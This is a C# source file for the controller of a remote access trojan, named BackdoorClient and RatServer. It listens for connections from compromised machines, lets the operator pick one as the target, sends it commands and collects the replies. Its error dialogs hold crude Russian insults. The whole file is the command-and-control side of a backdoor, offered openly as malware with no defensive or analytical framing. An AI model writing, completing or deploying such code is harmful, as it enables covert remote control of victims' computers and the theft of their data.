using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace BackdoorClient
{
    public class RatServer
    {
        public Action OnClientConnect = null;
        public Action OnClientDisсonnect = null;
        public List<Socket> connection { get; private set; } = new List<Socket>();

        private Socket target = null;
        private Socket sockBinder;
        private bool isListen = false;
        private Thread threadHandleConnections = null;
        private Thread threadHandleDisconnections = null;
        private string ip;
        private int port;

        public RatServer()
        {
        }

        public RatServer(string ipAdr, int portSock)
        {
            ip = ipAdr;
            port = portSock;
            Listen();
        }


        public RatServer(string ipAdr, int portSock, Action onClientConnect, Action onClientDisconnect = null)
        {
            ip = ipAdr;
            port = portSock;
            onClientConnect += onClientConnect;
            OnClientDisсonnect += onClientDisconnect;
            Listen();
        }

        ~RatServer()
        {
            threadHandleConnections.Abort();
            threadHandleDisconnections.Abort();
            for (int i = 0; i < connection.Count; i++)
            {
                connection[i].Close();
                connection[i].Dispose();
            }
        }

        public void SetTarget(int indexInConnection)
        {
            try
            {
                target = connection[indexInConnection];
            }
            catch (Exception)
            {
            }
        }

        public void DestroyServer()
        {
          if(threadHandleConnections != null &&
            threadHandleDisconnections != null)
          {
                sockBinder.Close();
                sockBinder.Dispose();
                threadHandleConnections.Abort();
                threadHandleDisconnections.Abort();
          }
           
        }

        private void Listen()
        {
            if (isListen) return;
            isListen = true;
            threadHandleConnections = new Thread(HandleConnections);
            threadHandleConnections.Start();

            threadHandleDisconnections = new Thread(HandleDisconnections);
            threadHandleDisconnections.Start();
        }

        private void StopListen()
        {
            if (threadHandleConnections == null || threadHandleDisconnections == null) return;
            threadHandleConnections.Abort();
            threadHandleDisconnections.Abort();
        }


        private void HandleConnections()
        {
            while (true)
            {
                Thread.Sleep(100);
                sockBinder = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);

                sockBinder.Bind(ipEndPoint);


                sockBinder.Listen(1);

                var conn = sockBinder.Accept();
                if (connection.Count == 0) target = conn;
                connection.Add(conn);
                OnClientConnect?.Invoke();

                sockBinder.Dispose();
            }
        }

        private void HandleDisconnections()
        {
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < connection.Count; i++)
                {
                    if (!connection[i].Connected)
                    {
                        OnClientDisсonnect?.Invoke();
                        connection[i].Dispose();
                    }
                }
            }
        }

        public string SendCommandAndGetResponce(string comm, int maxsize = 10000)
        {
            byte[] bytes = new byte[maxsize];

            byte[] msg = new byte[1];
            msg = Encoding.UTF8.GetBytes(comm);
            try
            {
                target.Send(msg);
            }
            catch (Exception)
            {
                MessageBox.Show("Дебил, нет связи подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return "";
            }

            int bytesRec = target.Receive(bytes);

            return Encoding.UTF8.GetString(bytes);
        }


        public byte[] SendCommandAndGetBytesResponce(string comm, int maxsize = 10000)
        {
            byte[] bytes = new byte[maxsize];

            byte[] msg = new byte[1];
            msg = Encoding.UTF8.GetBytes(comm);

            try
            {
                target.Send(msg);
            }
            catch (Exception e)
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return new byte[1];
            }

            int bytesRec = target.Receive(bytes);

            return bytes;
        }
    }
}